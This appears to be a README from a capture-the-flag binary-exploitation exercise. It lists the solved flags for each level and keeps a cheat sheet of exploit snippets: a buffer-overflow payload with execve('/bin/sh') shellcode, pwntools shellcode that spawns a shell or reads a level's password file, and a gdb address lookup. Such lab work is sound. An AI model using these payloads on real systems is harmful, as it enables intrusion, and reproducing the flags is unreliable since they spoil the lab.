# Override

# Description

...

# Flag

| N°      | Name            | Flag                                     |
|:-------:|-----------------|------------------------------------------|
| level00 | Atoi            | uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL |
| level01 | Buffer Overflow | PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv |
| level02 | Printf Format   | Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H |
| level03 | Switch Case     | kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf |
| level04 | Fork No Exec    | 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN |
| level05 | Printf Format 2 | h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq |
| level06 | Simple Auth     | GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8 |
| level07 |                 |  |
| level08 |                 |  |
| level09 |                 |  |

## Commands

```
export FILE=level02; mkdir $FILE; cd $FILE; touch source flag README.md; mkdir Ressources; cd Ressources; scp -P 4242 $FILE@192.168.1.116:/home/users/$FILE/$FILE .
```

### Overflow
#### Basic
```
(python -c "import struct; print('A' * (100 - 0) + struct.pack('<I', 0xffffffff))")
```

#### Shellcode
```
(python -c "import struct; print('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (100 - 21) + struct.pack('<I', 0xffffffff))")
```

### Shellcode
#### Cat
```
python -c "import pwn; shell = pwn.asm(pwn.shellcraft.i386.linux.cat('/home/users/level05/.pass')); print(shell); print(len(shell))"
```

#### Exec sh 1
```
python -c "import pwn; shell = pwn.asm(pwn.shellcraft.i386.linux.sh()); print(shell); print(len(shell))"
```

#### Exec sh 2
```
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
21
```

### GCC
#### Get env address
```
x/10s **(char***)&environ
```
